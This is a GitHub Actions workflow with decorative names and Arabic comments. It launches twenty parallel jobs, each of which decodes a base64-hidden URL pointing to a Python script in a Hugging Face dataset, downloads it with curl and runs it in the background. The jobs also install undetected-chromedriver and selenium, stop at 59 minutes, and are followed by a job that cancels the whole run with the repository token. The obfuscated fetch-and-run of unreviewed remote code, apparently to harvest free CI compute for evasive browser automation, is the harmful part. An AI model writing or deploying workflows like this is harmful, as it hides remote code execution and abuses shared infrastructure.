name: Umbral Prism Cascade Protocol

on:
  workflow_dispatch:

concurrency:
  group: umbral-prism-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # القيّم المطلق: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
  # =================================================================
  alpha-custodian:
    name: "Alpha Custodian"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - name: Raise Custodian Post
        run: |
          echo "[CUSTODIAN] Alpha custodian raised. Post anchored at the 59-minute frontier."
          echo "[CUSTODIAN] Run key verified: ${{ github.run_id }}"
          
          # فترة المكوث المحددة (3540 ثانية = 59 دقيقة)
          sleep 3540
          
          echo "[CUSTODIAN] Frontier breached! Issuing custodian warrant..."
          
          # إصدار أمر الإلغاء عبر GitHub API
          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
          
          echo "[CUSTODIAN] Warrant issued. Every active and queued prism will be refracted away."

  # =================================================================
  # سلسلة المنشور المتوازية: بناء وتشغيل عُقد المنشور
  # =================================================================
  prism-chain:
    name: "PrismNode-${{ matrix.prism_seq }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        prism_seq: [1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220]

    steps:
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الوصلة ‖1‖: رصف القاعدة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Pave Foundation
        run: |
          echo "[PAVE] Paving foundation for PrismNode-${{ matrix.prism_seq }} on Linux..."
          sudo apt update -qq
          sudo apt install -y curl python3-pip

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الوصلة ‖2‖: استدعاء شيفرة التشغيل
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Invoke Runner Code
        run: |
          echo "[INVOKE] Invoking prism_runner.py from assigned delivery relay..."
          DELIVERY_RELAY=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
          curl -sL "$DELIVERY_RELAY" -o prism_runner.py
          echo "[INVOKE] Runner code invoked."

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الوصلة ‖3‖: تثبيت الأطراف المرافقة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Fix Auxiliary Ends
        run: |
          echo "[FIX] Fixing auxiliary ends..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الوصلة ‖4‖: التنفيذ المقيّد بـ 59 دقيقة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Project Prism Ray
        run: |
          echo ">> Projecting PrismNode-${{ matrix.prism_seq }} ray..."
          
          # تشغيل العملية في الخلفية
          python3 prism_runner.py &
          PRISM_PID=$!
          
          echo ">> Prism ray projected. Cutoff: 59 minutes (3540s)."
          
          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
          sleep 3540
          
          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
          if kill -0 $PRISM_PID 2>/dev/null; then
            echo ">> Cutoff touched! Refracting ray away..."
            kill -9 $PRISM_PID
            echo ">> Ray refracted by cutoff keeper."
          else
            echo ">> Ray settled within cutoff."
          fi
